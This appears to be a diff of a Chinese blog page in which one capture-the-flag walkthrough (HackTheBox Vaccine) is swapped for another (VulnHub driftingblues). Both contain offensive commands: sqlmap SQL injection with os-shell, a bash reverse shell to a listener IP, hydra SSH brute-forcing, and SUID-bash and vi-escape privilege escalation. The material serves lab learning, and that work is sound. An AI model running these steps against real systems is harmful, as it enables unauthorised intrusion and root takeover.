@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>HackTheBox-Vaccine | colind0pe&#39;s blog</title>
-  <meta name="keywords" content=" HackTheBox ">
-  <meta name="description" content="HackTheBox-Vaccine | colind0pe&#39;s blog">
+  <title>driftingblues VulnHub Walkthrough | colind0pe&#39;s blog</title>
+  <meta name="keywords" content=" VulnHub ">
+  <meta name="description" content="driftingblues VulnHub Walkthrough | colind0pe&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#x31;&amp;#51;&amp;#55;&amp;#48;&amp;#50;&amp;#x32;&amp;#x37;&amp;#57;&amp;#x39;&amp;#x36;&amp;#x40;&amp;#x71;&amp;#113;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;">
 <meta property="og:type" content="website">
@@ -284,9 +284,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-HackTheBox-Vaccine" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-driftingblues-VulnHub-Walkthrough" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">HackTheBox-Vaccine</h1>
+        <h1 class="article-title">driftingblues VulnHub Walkthrough</h1>
     
     <div class="article-meta">
         
@@ -304,19 +304,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color1">HackTheBox</a>
+            <a class="color3">VulnHub</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-09-29 17:27:41'>2021-07-13 17:05</time>
+            发布时间 : <time class="date" title='最后更新: 2021-10-12 16:29:04'>2021-10-12 16:24</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:623</span>
+        <span>字数:558</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -335,7 +335,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-text">实验过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#driftingblues-VulnHub-Walkthrough"><span class="toc-text">driftingblues VulnHub Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-text">主机探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -351,75 +351,75 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png" alt="Screenshot_2021-08-04_09_35_14"></p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>端口扫描：</strong></p>
-<pre><code>nmap -sC -sV 10.10.10.46
+        <h2 id="driftingblues-VulnHub-Walkthrough"><a href="#driftingblues-VulnHub-Walkthrough" class="headerlink" title="driftingblues VulnHub Walkthrough"></a>driftingblues VulnHub Walkthrough</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><pre><code>arp-scan -l
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png" alt="Screenshot_2021-08-02_11_35_34"></p>
-<p>看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码</p>
-<p><img src="https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png" alt="Screenshot_2021-08-02_11_38_54"></p>
-<p>因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录</p>
-<pre><code>ftpuser/mc@F1l3ZilL4
+<p><img src="https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.172
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png" alt="Screenshot_2021-08-02_11_40_03"></p>
-<p>直接输入上一题中获得的用户名和密码可以成功登录</p>
-<p><img src="https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png" alt="Screenshot_2021-08-02_11_40_34"></p>
-<p>可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码</p>
-<p><img src="https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png" alt="Screenshot_2021-08-02_11_40_55"></p>
-<p>我们直接使用john来爆破</p>
-<pre><code>zip2john backup.zip &gt; hash
-john hash
-#因为我已经爆破过一次，所以可以直接show输出
-john hash --show
+<p><img src="https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png"></p>
+<p>只开放了22和80端口，只能先访问80端口看一下有没有什么信息</p>
+<p><img src="https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png"></p>
+<p>好像没什么东西，扫了目录也没什么信息</p>
+<p><img src="https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png"></p>
+<p>右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径</p>
+<p><img src="https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png"></p>
+<p>访问一下，这个很明显了，到在线的ook!解密网站解密一下</p>
+<p><img src="https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png"></p>
+<p>是一个提示，应该是要修改host文件</p>
+<p><img src="https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png"></p>
+<p>在主页上可以看到一个域名，尝试添加到host再访问</p>
+<p><img src="https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png"></p>
+<p><img src="https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png"></p>
+<p>重新扫目录还是没有发现，那就试试爆破子域名</p>
+<pre><code>wfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H &quot;Host:FUZZ.driftingblues.box&quot; --hw 570
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png" alt="Screenshot_2021-08-02_11_47_56"></p>
-<p>得到压缩包密码<code>7418529630</code>，解压后有<code>index.php</code>，从代码中可以看到用户名和md5加密的密码</p>
-<p><img src="https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png" alt="Screenshot_2021-08-02_11_48_29"></p>
-<p>将md5加密的密码到在线的md5解密网站解密，得到密码为<code>qwerty789</code></p>
-<p><img src="https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png" alt="Screenshot_2021-08-02_11_49_39"></p>
-<p>回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下</p>
-<p><img src="https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png" alt="Screenshot_2021-08-02_14_15_39"></p>
-<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入</p>
-<p><img src="https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png" alt="Screenshot_2021-08-02_14_15_53"></p>
-<p>那就直接用sqlmap跑，注意cookie要改成自己的值</p>
-<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;
+<p><img src="https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png"></p>
+<p>直接访问解析不了，需要再修改一下host</p>
+<p><img src="https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png"></p>
+<p>访问一下</p>
+<p><img src="https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png"></p>
+<p>再扫一次目录，发现有robots.txt</p>
+<p><img src="https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png"></p>
+<p>访问一下，看到给了一些路径</p>
+<p><img src="https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png"></p>
+<p>查看ssh_cred.txt，给了提示</p>
+<p><img src="https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>ssh登录的密码是<code>1mw4ckyyucky*</code>，目前还缺一位数字，一共十个可能的密码，先生成一下</p>
+<pre><code>crunch 13 13 -t 1mw4ckyyucky% &gt; pass
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png" alt="Screenshot_2021-08-03_09_22_43"></p>
-<p><img src="https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png" alt="Screenshot_2021-08-03_09_26_33"></p>
-<p>可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell</p>
-<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot; --os-shell
+<p>看一下我们生成的密码集合</p>
+<p><img src="https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png"></p>
+<p>接下来尝试爆破ssh登录密码，根据前面访问<code>test.driftingblues.box</code>的提示，用户名应该是<code>eric</code></p>
+<pre><code>hydra -l eric -P pass ssh://192.168.62.172
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png" alt="Screenshot_2021-08-03_09_27_03"></p>
-<p>接下来反弹shell，开启一个监听端口</p>
-<p><img src="https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png" alt="Screenshot_2021-08-03_09_27_50"></p>
-<p>在sqlmap的shell中输入</p>
-<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.60/1234 0&gt;&amp;1&#39;
+<p><img src="https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png"></p>
+<p>找到密码了，直接登录ssh</p>
+<p><img src="https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png"></p>
+<p>直接获取第一个flag</p>
+<img src="https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png" style="zoom:67%;" />
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><pre><code>uname -a
+find / -perm -u=s -type f 2&gt;/dev/null
+getcap -r  / 2&gt;/dev/null
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png" alt="Screenshot_2021-08-03_09_28_01"></p>
-<p>成功接收到反弹的shell</p>
-<p><img src="https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png" alt="Screenshot_2021-08-03_09_28_19"></p>
-<p><img src="https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png" alt="Screenshot_2021-08-03_09_29_41"></p>
-<p>先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码</p>
-<p><img src="https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png" alt="Screenshot_2021-08-03_09_31_35"></p>
-<p>接下来先得到交互式的shell</p>
-<pre><code>#看别的walkthrough说是两个都可以，但是我用第一个不行
-SHELL=/bin/bash script -q /dev/null
-python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+<p>看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方</p>
+<p>在备份目录下有个backup.sh，看一下内容</p>
+<p><img src="https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png"></p>
+<p>有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权</p>
+<p>思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了</p>
+<pre><code>echo &#39;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#39; &gt; /tmp/emergency
+#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限
+chmod +x emergency
+./getroot -p
 </code></pre>
-<p>得到交互式的shell后，可以通过<code>sudo -l</code>命令查看当前用户的权限，用户被允许编辑配置文件<code>/etc/postgresql/11/main/pg_hba.conf</code>，可以利用<code>vi</code>并验证密码提权至<code>root</code></p>
-<pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
-</code></pre>
-<p><img src="https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png" alt="Screenshot_2021-08-03_09_33_34"></p>
-<p><img src="https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png" alt="Screenshot_2021-08-03_09_34_36"></p>
-<p>输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得<code>root</code>权限</p>
-<pre><code>:!/bin/bash
-</code></pre>
-<p><img src="https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png" alt="Screenshot_2021-08-03_09_35_30"></p>
-<p>最后就可以读取root的flag了</p>
-<p><img src="https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png" alt="Screenshot_2021-08-03_09_36_08"></p>
+<p><img src="https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png"></p>
+<p><img src="https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png"></p>
+<p>现在可以获取第二个flag了</p>
+<img src="https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png" style="zoom:67%;" />
+
 <blockquote>
 <p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.echocipher.life/index.php/archives/891/">https://www.echocipher.life/index.php/archives/891/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45922278/article/details/115277255">https://blog.csdn.net/weixin_45922278/article/details/115277255</a></p>
 </blockquote>
 
       
